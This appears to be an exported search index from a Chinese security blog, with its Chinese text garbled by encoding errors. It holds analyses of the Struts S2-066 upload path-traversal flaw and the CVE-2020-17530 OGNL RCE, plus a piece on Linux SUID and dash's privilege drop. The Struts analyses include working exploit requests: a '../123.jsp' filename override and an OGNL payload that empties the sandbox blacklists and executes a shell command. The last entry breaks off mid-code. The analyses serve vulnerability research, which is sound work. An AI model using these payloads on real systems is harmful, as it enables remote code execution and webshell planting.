boolean isSet = false; boolean isIs = false; if ((isSet = ms.startsWith(\u0026#34;set\u0026#34;)) || ms.startsWith(\u0026#34;get\u0026#34;) || (isIs = ms.startsWith(\u0026#34;is\u0026#34;))) { int prefixLength = isIs ? 2 : 3; if (isSet == findSets \u0026amp;\u0026amp; baseName.length() == ms.length() - prefixLength) { result.add(method); } } } } getSetMethodè·å–åˆ°æ–¹æ³•åï¼Œä¼šé€šè¿‡cacheSetMethod.put(targetClass, propertyName, method);ä¿å­˜åˆ°ç¼“å­˜å†…ã€‚ è€Œåå†æ¬¡è°ƒç”¨æ—¶ï¼Œå¯ä»¥è·å–åˆ°setUploadæ–¹æ³•æœ€ç»ˆé€šè¿‡invokeMethodæ–¹æ³•è°ƒç”¨ã€‚ è€Œå¯¹äºæ¶æ„å‚æ•°uploadFileNameï¼Œç”±äºç¼“å­˜ä¸­æ²¡æœ‰uploadFileNameï¼Œæ‰€ä»¥ä¼šå°è¯•é€šè¿‡_getSetMethodè·å–å¯¹åº”çš„setæ–¹æ³•ã€‚ è¿™é‡Œç¢°åˆ°äº†ä¸€ä¸ªå‘ï¼Œä¼—æ‰€å‘¨çŸ¥Actionä¸­æ–¹æ³•åä¸ºsetUploadFileNameå¯¹åº”äºendwith UploadFileNameï¼Œè€ŒuploadFileName æ˜¾ç„¶ä¸æ»¡è¶³æ¡ä»¶ï¼ŒæŒ‰é“ç†åœ¨addIfAccessoræ–¹æ³•ä¸­åº”è¯¥è·å–ä¸åˆ°å¯¹åº”çš„setæ–¹æ³•æ‰æ˜¯ï¼Œåå¸¸çš„æ˜¯å…¶åè€Œè·å–åˆ°äº†ï¼Œåœ¨é‡æ–°è°ƒè¯•ï¼Œæ‰å‘ç°åœ¨getDeclaredMethodsè°ƒç”¨collectAccessorsæ–¹æ³•ä¹‹å‰ï¼Œä¼ å…¥çš„baseNameå‚æ•°å·²ç»å˜æˆäº†UploadFileNameï¼Œæ»¡è¶³å‰é¢çš„æ¡ä»¶ï¼Œè·å–åˆ°äº†getæ–¹æ³•ã€‚ å¾ˆæ˜æ˜¾ï¼ŒbaseNameç”±capitalizeBeanPropertyNameæ–¹æ³•è¿”å›å¾—åˆ°\næŸ¥çœ‹capitalizeBeanPropertyNameæ–¹æ³•ï¼Œä¼ å…¥çš„propertyNameä¸ºuploadFileName\nprivate static String capitalizeBeanPropertyName(String propertyName) { if (propertyName.length() == 1) { return propertyName.toUpperCase(); } else if (propertyName.startsWith(\u0026#34;get\u0026#34;) \u0026amp;\u0026amp; propertyName.endsWith(\u0026#34;()\u0026#34;) \u0026amp;\u0026amp; Character.isUpperCase(propertyName.substring(3, 4).charAt(0))) { return propertyName; } else if (propertyName.startsWith(\u0026#34;set\u0026#34;) \u0026amp;\u0026amp; propertyName.endsWith(\u0026#34;)\u0026#34;) \u0026amp;\u0026amp; Character.isUpperCase(propertyName.substring(3, 4).charAt(0))) { return propertyName; } else if (propertyName.startsWith(\u0026#34;is\u0026#34;) \u0026amp;\u0026amp; propertyName.endsWith(\u0026#34;()\u0026#34;) \u0026amp;\u0026amp; Character.isUpperCase(propertyName.substring(2, 3).charAt(0))) { return propertyName; } else { char first = propertyName.charAt(0); char second = propertyName.charAt(1); if (Character.isLowerCase(first) \u0026amp;\u0026amp; Character.isUpperCase(second)) { return propertyName; } else { char[] chars = propertyName.toCharArray(); chars[0] = Character.toUpperCase(chars[0]); return new String(chars); } } } å¿½ç•¥å‰é¢çš„ifï¼Œåœ¨æœ€åä¸€ä¸ªelseä¸­ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å°å†™ï¼Œç¬¬äºŒä¸ªå­—ç¬¦æ˜¯å¤§å†™åˆ™ä¼šç›´æ¥è¿”å›ï¼Œå¦åˆ™ä¼šå°†ç¬¬ä¸€ä¸ªå­—ç¬¦å˜ä¸ºå¤§å†™ï¼Œæ‰€ä»¥uploadFileNameåœ¨ç»è¿‡å¤„ç†åä¼šå˜ä¸ºUploadFileNameï¼Œæ‰€ä»¥åœ¨åé¢å¯ä»¥é€šè¿‡addIfAccessoré‡Œé¢çš„åˆ¤æ–­ï¼Œè·å–åˆ°setUploadFileNameæ–¹æ³•ã€‚\nä¹Ÿå°±æ˜¯è¯´ä¼šè°ƒç”¨ä¸¤æ¬¡setUploadFileNameæ–¹æ³•ï¼Œè€ŒMapä¸­å¤§å†™çš„keyæ’åœ¨å°å†™çš„keyå‰é¢ï¼Œæ‰€ä»¥é¦–å…ˆä¼šè·å–åˆ°ç»è¿‡ç›®å½•ç©¿è¶Šè¿‡æ»¤å™¨è¿‡æ»¤çš„çš„æ­£ç¡®çš„UploadFileNameå¹¶é€šè¿‡setUploadFileNameæ–¹æ³•è®¾ç½®åˆ°actionä¸­çš„UploadFileNameå±æ€§ä¸­ è€Œåä¼šè®¾ç½®uploadFileNameçš„å‚æ•°ï¼Œè€Œè¯¥å‚æ•°ä¸ä¼šç»è¿‡ç›®å½•ç©¿è¶Šè¿‡æ»¤å™¨ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå±æ€§å¯ä»¥é€šè¿‡../è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè€Œåå†æ¬¡è°ƒç”¨ setUploadFileNameæ–¹æ³•actionä¸­çš„UploadFileNameå±æ€§ä¸­ï¼Œå®Œæˆäº†å˜é‡è¦†ç›–ã€‚\nPoC\nPOST /upload.action HTTP/1.1 Host: 127.0.0.1 Accept: */* Accept-Encoding: gzip, deflate Content-Length: 400 Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 --------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN Content-Disposition: form-data; name=\u0026#34;Upload\u0026#34;; filename=\u0026#34;1.txt\u0026#34; Content-Type: text/plain 1aaa --------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN Content-Disposition: form-data; name=\u0026#34;uploadFileName\u0026#34;; Content-Type: text/plain ../123.jsp --------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN-- å°ç»“ è¿™ä¸ªæ¼æ´å·§å¦™åœ°åˆ©ç”¨äº†strutsä¸­å¯¹å±æ€§çš„è§„èŒƒåŒ–å’ŒMapå­˜å‚¨é¡ºåºï¼Œåˆ©ç”¨å‚æ•°ç»‘å®šå·§å¦™åœ°ç»•è¿‡äº†ç›®å½•ç©¿è¶Šçš„è¿‡æ»¤ï¼ŒæˆåŠŸè¿›è¡Œå˜é‡è¦†ç›–ï¼Œä»è€Œè¿›è¡Œç›®å½•ç©¿è¶Šï¼Œå¯ä»¥åˆ©ç”¨ç›®å½•ç©¿è¶Šåœ¨æ•æ„Ÿç›®å½•å†™å…¥webshellï¼Œè¾¾æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚\nè€Œåœ¨è¡¥ä¸ä¸­åœ¨ä½¿ç”¨appendAllä¹‹å‰ä¼šè°ƒç”¨removeæ–¹æ³•ï¼Œremoveæ–¹æ³•ä¼šå¿½ç•¥å¤§å°å†™ï¼Œå¦‚æœå­˜åœ¨ç›¸åŒçš„å‚æ•°åˆ™ç§»é™¤ä¹‹å‰ï¼Œæ‰€ä»¥å½“ä½¿ç”¨å°å†™æ–¹å¼å°è¯•åˆ©ç”¨æ—¶ï¼Œåœ¨appendAllæ–¹æ³•å†…ä¼šå…ˆç§»é™¤å­˜åœ¨çš„uploadFileNameé¡¹ï¼Œä»è€Œé¿å…äº†åç»­çš„å˜é‡è¦†ç›–ã€‚ å‚è€ƒé“¾æ¥\nhttps://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)\nhttps://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/\nCreated at 2023-12-12T11:18:52+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"æ¼æ´åˆ†æ","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/linux/","title":"linux","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/research/linux/suid/","title":"Suid","tags":["å®‰å…¨ç ”ç©¶","linux"],"description":"","content":"ç®€ä»‹ SUIDå…¨ç§°Set owner User ID up on executionï¼Œæ˜¯Linuxç»™å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ä¸ªå±æ€§ï¼Œè®¾ç½®äº†sä½çš„ç¨‹åºåœ¨è¿è¡Œæ—¶å…¶Effective UIDå°†ä¼šè®¾ç½®ä¸ºè¿™ä¸ªç¨‹åºçš„æ‰€æœ‰è€…ã€‚æ¯”å¦‚ï¼Œ/bin/pingè¿™ä¸ªç¨‹åºçš„æ‰€æœ‰è€…æ˜¯0ï¼ˆrootï¼‰ï¼Œå®ƒè®¾ç½®äº†sä½ï¼Œé‚£ä¹ˆæ™®é€šç”¨æˆ·åœ¨è¿è¡Œpingæ—¶å…¶Effective UIDå°±æ˜¯0ï¼Œç­‰åŒäºæ‹¥æœ‰äº†rootæƒé™ã€‚\nâœ c ls -ldb $(which pkexec) -rwsr-xr-x 1 root root 30872 2023å¹´ 2æœˆ13æ—¥ /usr/bin/pkexec SUIDæ–‡ä»¶çš„å‡ºç°æ˜¯ä¸ºäº†è§£å†³ä¸€äº›æ“ä½œåªèƒ½ç”±rootæƒé™è¿›è¡Œï¼Œä½†æ™®é€šæƒé™ç”¨æˆ·ä¹Ÿéœ€è¦èƒ½é€šè¿‡æŸç§æ–¹å¼è¿›è¡Œè°ƒç”¨ï¼Œæ¯”å¦‚passwdï¼Œ/etc/shadowåªæœ‰rootå¯å†™ï¼Œä½†ç”¨æˆ·è‡ªå·±æ˜¾ç„¶éœ€è¦å¯ä»¥ä¿®æ”¹å¯†ç ï¼Œæ‰€ä»¥passwdè¢«è®¾ç½®ä¸ºSUIDç¨‹åºï¼Œä½¿å¾—æ™®é€šç”¨æˆ·èƒ½é€šè¿‡passwdä¸´æ—¶è·å–åˆ°ä¿®æ”¹shadowæ–‡ä»¶çš„èƒ½åŠ›ã€‚\n-rw-r----- 1 root shadow 1411 2023å¹´ 5æœˆ10æ—¥ /etc/shadow -rwsr-xr-x 1 root root 68248 2022å¹´11æœˆ11æ—¥ /usr/bin/passwd Linuxä¸­æ¯ä¸ªç”¨æˆ·éƒ½æœ‰ç‹¬ä¸€æ— äºŒçš„IDï¼Œç§°ä¸ºUserIDã€‚ ä¸ºè¿›ç¨‹å®šä¹‰äº†ä¸‰ä¸ªIDï¼š\nReal UserID Effective UserID Saved UserID Real UserIDï¼šå¯¹äºä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™ä¸ªIDæ˜¯å¯åŠ¨è¿™ä¸ªè¿›ç¨‹çš„ç”¨æˆ·çš„ç”¨æˆ·IDï¼Œè¿™ä¸ªIDå®šä¹‰äº†è¿™ä¸ªè¿›ç¨‹æœ‰æƒè®¿é—®é‚£äº›æ–‡ä»¶ã€‚ Effective UserIDï¼šé€šå¸¸è¿™ä¸ªIDå’ŒReal UserIDç›¸åŒï¼Œä½†æœ‰æ—¶ä¼šä¸ä¸€æ ·ï¼Œæ¥å…è®¸éç‰¹æƒç”¨æˆ·è®¿é—®åªèƒ½ç”±ç‰¹æƒç”¨æˆ·è®¿é—®çš„æ–‡ä»¶ã€‚ å½“éç‰¹æƒçš„ç”¨æˆ·è¿è¡Œæ­¤æ–‡ä»¶æ—¶ï¼Œeuidæ˜¯æ–‡ä»¶æ‰€å±çš„ç”¨æˆ·idï¼Œruidæ‰æ˜¯å½“å‰ç”¨æˆ·çš„id -rwsr-xr-x 1 root root 68248 2022å¹´11æœˆ11æ—¥ /usr/bin/passwd â”Œâ”€â”€(chestnutã‰¿chestnut)-[/root/code/c] â””â”€$ passwd ä¸º chestnut æ›´æ”¹ STRESS å¯†ç ã€‚ âœ c ps -eo pid,euid,ruid | grep 1692693 1692693 0 1000 Saved UserIDï¼Œå½“è¿›ç¨‹ä»¥æå‡æƒé™è¿è¡Œæ—¶ï¼Œéœ€è¦åšä¸€äº›éç‰¹æƒçš„æ“ä½œï¼Œå¯ä»¥é€šè¿‡ä¸´æ—¶åˆ‡æ¢åˆ°éç‰¹æƒè´¦æˆ·æ¥å®ç°ã€‚ åœ¨æ‰§è¡Œä½æƒé™å·¥ä½œæ—¶ï¼Œå°†Effective UID æ›´æ”¹ä¸ºæŸä¸ªè¾ƒä½çš„æƒé™å€¼ï¼Œå¹¶å°† euid ä¿å­˜åˆ°Saved userIDï¼ˆsuidï¼‰ï¼Œä»¥ä¾¿åœ¨ä»»åŠ¡å®Œæˆæ—¶ç”¨äºåˆ‡æ¢å›ç‰¹æƒå¸æˆ·ã€‚ https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/\næŸ¥æ‰¾SUIDç¨‹åº\nfind / -perm -4000 -type f -exec ls -ldb {} \\; -perm -4000 æŸ¥æ‰¾æƒé™ä¸º4000 -type f åªæŸ¥æ‰¾æ™®é€šæ–‡ä»¶,è¿‡æ»¤æ‰ç›®å½•ç­‰å…¶ä»–ç±»å‹ -[/root/code/c/suid.c /root/code/c/CMakeLists.txt](vscode-remote://ssh-remote%2B192.168.59.211/root/code/c/suid.c)exec ls -ldb {} ; å¯¹æ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡Œls -ldbå‘½ä»¤,æ˜¾ç¤ºæ–‡ä»¶è¯¦ç»†ä¿¡æ¯ã€‚ {}è¡¨ç¤ºfindæ‰¾åˆ°çš„æ–‡ä»¶å,ä¼šé€ä¸ªä»£å…¥ã€‚ ;è¡¨ç¤º-execé€‰é¡¹å‘½ä»¤ç»“æŸã€‚ ; çš„ä½œç”¨å°±æ˜¯éš”ç¦» find å‘½ä»¤è¡Œå’Œ -exec æŒ‡å®šçš„å‘½ä»¤,é¿å…è§£æé”™è¯¯ã€‚ -rwsr-xr-x 1 root root 30872 2023å¹´ 2æœˆ13æ—¥ /usr/bin/pkexec -rwsr-xr-x 1 root root 14888 2023å¹´ 1æœˆ 3æ—¥ /usr/bin/vmware-user-suid-wrapper -rwsr-xr-- 1 root kismet 146216 2022å¹´12æœˆ27æ—¥ /usr/bin/kismet_cap_nxp_kw41z -rwsr-xr-- 1 root kismet 142120 2022å¹´12æœˆ27æ—¥ /usr/bin/kismet_cap_nrf_51822 -rwsr-xr-x 1 root root 59704 2023å¹´ 2æœˆ13æ—¥ /usr/bin/mount -rwsr-xr-- 1 root kismet 216392 2022å¹´12æœˆ27æ—¥ /usr/bin/kismet_cap_linux_wifi -rwsr-xr-- 1 root kismet 142120 2022å¹´12æœˆ27æ—¥ /usr/bin/kismet_cap_ubertooth_one -rwsr-xr-- 1 root kismet 146216 2022å¹´12æœˆ27æ—¥ /usr/bin/kismet_cap_rz_killerbee -rwsr-xr-x 1 root root 68248 2022å¹´11æœˆ11æ—¥ /usr/bin/passwd -rwsr-xr-- 1 root kismet 146216 2022å¹´12æœˆ27æ—¥ /usr/bin/kismet_cap_nrf_mousejack -rwsr-xr-- 1 root kismet 142120 2022å¹´12æœˆ27æ—¥ /usr/bin/kismet_cap_nrf_52840 -rwsr-xr-x 1 root root 88496 2022å¹´11æœˆ11æ—¥ /usr/bin/gpasswd -rwsr-xr-x 1 root root 35128 2023å¹´ 2æœˆ13æ—¥ /usr/bin/umount -rwsr-xr-- 1 root kismet 154408 2022å¹´12æœˆ27æ—¥ /usr/bin/kismet_cap_linux_bluetooth -rwsr-xr-- 1 root kismet 146216 2022å¹´12æœˆ27æ—¥ /usr/bin/kismet_cap_ti_cc_2531 shellä¸­çš„SUIDç»†èŠ‚ åœ¨\rhttps://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.htmlä¸­æåˆ°Ubuntuå¯¹dashè¿›è¡Œäº†patchã€‚ æ‰¾åˆ°patchåœ°å€ä¸º\rhttps://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gzï¼Œä»£ç å¦‚ä¸‹ï¼Œå½“on=1æ—¶ä¼šç•¥è¿‡æƒé™æ£€æŸ¥ï¼Œå½“onä¸ä¸º1æ—¶ï¼Œä¼šé€šè¿‡geteuidå’Œgetegidè·å–å½“å‰è¿›ç¨‹çš„effective user IDå’Œeffective group IDï¼Œå¹¶ä¸é€šè¿‡getuidå’Œgetgidè·å–çš„real user IDå’Œreal group IDè¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœå½“å‰è¿›ç¨‹å¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸ºSUIDæ–‡ä»¶ä¸”å½“å‰è¿è¡Œè¿™ä¸ªæ–‡ä»¶çš„ç”¨æˆ·ä¸æ˜¯æ–‡ä»¶å±ä¸»æ—¶ï¼Œä¼šé‡æ–°é€šè¿‡setuidå’Œsetgidå°†å½“å‰è¿›ç¨‹çš„æƒé™è®¾ç½®ä¸ºreal IDï¼Œå³è¿è¡Œè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„ç”¨æˆ·çš„æƒé™ã€‚ å½“æ–‡ä»¶ä¸æ˜¯SUIDæ–‡ä»¶æ—¶ridå’Œeidç›¸ç­‰ï¼Œä¸ä¼šè¿›å…¥ifå†…ï¼Œæˆ–è€…æ–‡ä»¶æ˜¯SUIDæ–‡ä»¶å¹¶ä¸”è¿è¡Œè¿™ä¸ªæ–‡ä»¶çš„ç”¨æˆ·æ˜¯æ–‡ä»¶å±ä¸»ridå’Œeidä¹Ÿä¼šç›¸ç­‰ï¼Œä¸ä¼šè¿›å…¥ifå†…ã€‚\n+diff -Naurp dash-0.5.7.ori/src/main.c dash-0.5.7/src/main.c +--- dash-0.5.7.ori/src/main.c\t2015-06-03 10:45:22.766472281 -0400 ++++ dash-0.5.7/src/main.c\t2015-06-03 10:58:56.484258181 -0400 +@@ -97,11 +97,16 @@ main(int argc, char **argv) + struct jmploc jmploc; + struct stackmark smark; + int login; ++\tuid_t uid; ++\tgid_t gid; + + #ifdef __GLIBC__ + dash_errno = __errno_location(); + #endif + ++\tuid = getuid(); ++\tgid = getgid(); +diff -Naurp dash-0.5.7.ori/src/priv.c dash-0.5.7/src/priv.c +--- dash-0.5.7.ori/src/priv.c\t1969-12-31 19:00:00.000000000 -0500 ++++ dash-0.5.7/src/priv.c\t2015-06-03 11:00:31.097386153 -0400 +@@ -0,0 +1,27 @@ ++#include \u0026lt;unistd.h\u0026gt; ++ ++#include \u0026#34;priv.h\u0026#34; ++#include \u0026#34;var.h\u0026#34; ++ ++uid_t uid; ++gid_t gid; ++ ++void setprivileged(int on) ++{ ++\tstatic int is_privileged = 1; ++\tif (is_privileged == on) ++\treturn; ++ ++\tis_privileged = on; ++ ++\t/* ++\t* To limit bogus system(3) or popen(3) calls in setuid binaries, require ++\t* -p flag to work in this situation. ++\t*/ ++\tif (!on \u0026amp;\u0026amp; (uid != geteuid() || gid != getegid())) { ++\tsetuid(uid); ++\tsetgid(gid); ++\t/* PS1 might need to be changed accordingly. */ ++\tchoose_ps1(); ++\t} ++} é‚£ä¹ˆä¸ºä»€ä¹ˆè¦è¿™æ ·å®ç°å‘¢ï¼Ÿä¸ºä»€ä¹ˆå¦‚æœéœ€è¦ç»§æ‰¿é»˜è®¤çš„effective user IDå’Œeffective group IDéœ€è¦æ˜¾å¼çš„ä½¿ç”¨-på‚æ•°å‘¢ï¼Ÿ å‡è®¾æˆ‘ä»¬æœ‰å¦‚ä¸‹suidç¨‹åºï¼Œå¹¶ä¸”è¯¥ç¨‹åºç”±www-dataç”¨æˆ·å¯åŠ¨ï¼š\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main(int argc, char *argv[]) { printf(\u0026#34;%s\\n\u0026#34;, argv[1]); return system(argv[1]); } å…¶ä¸­é€šè¿‡systemå‡½æ•°æ‰§è¡Œç”¨æˆ·ä¼ å…¥çš„å‘½ä»¤ï¼Œsystemå®ç°å¯ä»¥\råœ¨è¿™æ‰¾åˆ°ï¼Œå¯ä»¥çœ‹åˆ°å®é™…æ‰§è¡Œçš„æ˜¯/bin/sh -c commandï¼ŒåŠ å…¥æ”»å‡»è€…ä¼ å…¥æ¶æ„å‘½ä»¤ï¼Œå°è¯•é€šè¿‡è¯¥ç¨‹åºä»¥rootæƒé™æ‰§è¡Œå‘½ä»¤ï¼Œæœ€ç»ˆä»¥/bin/sh -c commandçš„å½¢å¼æ‰§è¡Œå‘½ä»¤ã€‚\n#define\tSHELL_PATH\t\u0026#34;/bin/sh\u0026#34;\t/* Path of the shell. */ #define\tSHELL_NAME\t\u0026#34;sh\u0026#34;\t/* Name to give it. */ do_system (const char *line) { int status = -1; int ret; pid_t pid; struct sigaction sa; #ifndef _LIBC_REENTRANT struct sigaction intr, quit; #endif ..... __posix_spawnattr_init (\u0026amp;spawn_attr); __posix_spawnattr_setsigmask (\u0026amp;spawn_attr, \u0026amp;omask); __posix_spawnattr_setsigdefault (\u0026amp;spawn_attr, \u0026amp;reset); __posix_spawnattr_setflags (\u0026amp;spawn_attr, POSIX_SPAWN_SETSIGDEF | POSIX_SPAWN_SETSIGMASK); ret = __posix_spawn (\u0026amp;pid, SHELL_PATH, 0, \u0026amp;spawn_attr, (char *const[]){ (char *) SHELL_NAME, (char *) \u0026#34;-c\u0026#34;, (char *) line, NULL }, __environ); å¦‚æœæ²¡æœ‰å‰é¢è¯´çš„æªæ–½ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥æˆåŠŸä»¥rootæƒé™æ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œä½†é€šè¿‡ä¸Šé¢çš„æªæ–½ï¼Œåˆ™ä¼šå‡ºç°å¦‚ä¸‹ï¼šå› ä¸ºè¿›ç¨‹çš„ridä¸ºwww-dataï¼Œeidä¸ºrootï¼Œè€Œé€šè¿‡systemå‡½æ•°æ‰§è¡Œå‘½ä»¤ä¸èƒ½æ˜¾å¼è®¾ç½®-på‚æ•°ï¼Œå¯¼è‡´åœ¨æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œä¸èƒ½é€šè¿‡ifåˆ¤æ–­ï¼Œå‘½ä»¤çš„æƒé™ä¼šè¢«é™ä¸ºwww-dataæƒé™ï¼Œä»è€Œä¸€å®šç¨‹åº¦ä¸Šç¼“è§£äº†æ”»å‡»ã€‚\nå‚è€ƒèµ„æ–™\nhttps://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html\nCreated at 2023-12-08T10:30:07+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/","title":"CVE-2020-17530 Apache Struts OGNL RCEåˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Struts2 ä¼šå¯¹æŸäº›æ ‡ç­¾å±æ€§(æ¯”å¦‚ idï¼Œå…¶ä»–å±æ€§æœ‰å¾…å¯»æ‰¾) çš„å±æ€§å€¼è¿›è¡ŒäºŒæ¬¡è¡¨è¾¾å¼è§£æï¼Œå› æ­¤å½“è¿™äº›æ ‡ç­¾å±æ€§ä¸­ä½¿ç”¨äº† %{x} ä¸” x çš„å€¼ç”¨æˆ·å¯æ§æ—¶ï¼Œç”¨æˆ·å†ä¼ å…¥ä¸€ä¸ª %{payload} å³å¯é€ æˆOGNLè¡¨è¾¾å¼æ‰§è¡Œã€‚S2-061æ˜¯å¯¹S2-059æ²™ç›’è¿›è¡Œçš„ç»•è¿‡ã€‚\nå½±å“ç‰ˆæœ¬ struts 2.0.0 - struts 2.5.25 ç¯å¢ƒæ­å»º ä½¿ç”¨docker composeå¯åŠ¨å®¹å™¨ï¼Œåœ¨docker-compose.ymlä¸­åŠ å…¥å¦‚ä¸‹ï¼š\n-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 è€Œåä½¿ç”¨IDEAå¼€å¯è¿œç¨‹è°ƒè¯•ï¼Œå¯¹äºJAVA8ï¼Œéœ€è¦å»é™¤addressçš„*:\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• é™æ€åˆ†æ é¦–å…ˆåˆ†æPoCï¼Œè§‚å¯ŸPoCå¯ä»¥çŸ¥é“ï¼ŒPoCé€šè¿‡è¡¨è¾¾å¼å£°æ˜äº†instancemanagerå˜é‡ï¼Œç±»å‹ä¸ºorg.apache.tomcat.InstanceManagerï¼Œè€Œåé€šè¿‡instancemanager.newInstanceå®ä¾‹åŒ–org.apache.commons.collections.BeanMapå¯¹è±¡ï¼Œå¹¶é€šè¿‡bean.setBeanæ–¹æ³•å°†com.opensymphony.xwork2.util.ValueStack.ValueStackè®¾ç½®åˆ°beanä¸­ã€‚\nPOST /index.action HTTP/1.1 Host: 192.168.59.211:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://192.168.59.211:8080/.action;jsessionid=node010obz75lhtwqg1daa8msd7zvl70.node0 Connection: close Cookie: i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node014s7soaddt6u41im2x0qfyngjk1.node0 Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Length: 827 ------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name=\u0026#34;id\u0026#34; %{(#instancemanager=#application[\u0026#34;org.apache.tomcat.InstanceManager\u0026#34;]).(#stack=#attr[\u0026#34;com.opensymphony.xwork2.util.ValueStack.ValueStack\u0026#34;]).(#bean=#instancemanager.newInstance(\u0026#34;org.apache.commons.collections.BeanMap\u0026#34;)).(#bean.setBean(#stack)).(#context=#bean.get(\u0026#34;context\u0026#34;)).(#bean.setBean(#context)).(#macc=#bean.get(\u0026#34;memberAccess\u0026#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\u0026#34;java.util.HashSet\u0026#34;)).(#bean.put(\u0026#34;excludedClasses\u0026#34;,#emptyset)).(#bean.put(\u0026#34;excludedPackageNames\u0026#34;,#emptyset)).(#arglist=#instancemanager.newInstance(\u0026#34;java.util.ArrayList\u0026#34;)).(#arglist.add(\u0026#34;id\u0026#34;)).(#execute=#instancemanager.newInstance(\u0026#34;freemarker.template.utility.Execute\u0026#34;)).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- com.opensymphony.xwork2.util.ValueStack.ValueStackä¸­å­˜å‚¨äº†å½“å‰è¯·æ±‚ç›¸å…³çš„ä¸€äº›å¯¹è±¡ï¼Œå¦‚ä¸‹å›¾è§£é‡Šï¼Œæ¥è‡ª\rhttps://www.cnblogs.com/xtdxs/p/6527380.html è€Œååˆ†åˆ«é€šè¿‡bean.setBeanå’Œbean.getè·å–åˆ°äº†å¯¹è±¡è·å–åˆ°äº†com.opensymphony.xwork2.util.ValueStack.ValueStack.contextï¼Œå®é™…ä¸Šå°±æ˜¯ä¸‹é¢è¿™ä¸ªå¯¹è±¡\nç»§ç»­é€šè¿‡ä»¥ä¸Šæ–¹å¼ä½¿ç”¨bean.getè·å–SecurityMemberAccesså¯¹è±¡ï¼Œè€Œåé€šè¿‡bean.putæ–¹æ³•è®¾ç½®SecurityMemberAccess.excludedPackageNameså’ŒSecurityMemberAccess.excludedClassesä¸ºç©ºã€‚\næœ€åé€šè¿‡freemarker.template.utility.Execute.execæ‰§è¡ŒShell å‘½ä»¤ã€‚\næ•´ä½“æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ€è·¯æ˜¯é€šè¿‡Beançš„get/setæ–¹æ³•é—´æ¥è·å–åˆ°OgnlContextï¼Œè€Œåé€šè¿‡OgnlContextè·å–åˆ°SecurityMemberAccesså¯¹è±¡å¹¶æŠŠé‡Œé¢çš„é»‘åå•ç½®ç©ºï¼Œæœ€åè°ƒç”¨é»‘åå•ä¸­çš„freemarker.template.utility.Execute.execæ‰§è¡Œå‘½ä»¤ã€‚\nåŠ¨æ€è°ƒè¯• ä½¿ç”¨dockerå¯åŠ¨ç¯å¢ƒåï¼Œæ‹·è´é‡Œé¢çš„å…³é”®jaråŒ…ï¼Œæ–°å»ºIDEAé¡¹ç›®ï¼Œå¯¼å…¥jaråŒ…ï¼Œå¼€å¯è¿œç¨‹è°ƒè¯•ã€‚\nåœ¨org.apache.commons.collections.BeanMapæ„é€ å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿è¡ŒPoCï¼ŒIDEAæ–­ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¦‚ä¸‹\nè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\nåœ¨compileAndExecute:523, OgnlUtil (com.opensymphony.xwork2.ognl)ä¸­çœ‹åˆ°ä¼ å…¥çš„payloadå·²ç»è¢«è§£æä¸ºäº†ASTé“¾ã€‚ è€Œååœ¨getValueBody:141, ASTChain (ognl) [1]é€šè¿‡å¾ªç¯ï¼Œéå†å¤„ç†\nprotected Object getValueBody(OgnlContext context, Object source) throws OgnlException { Object result = source; int i = 0; for(int ilast = this._children.length - 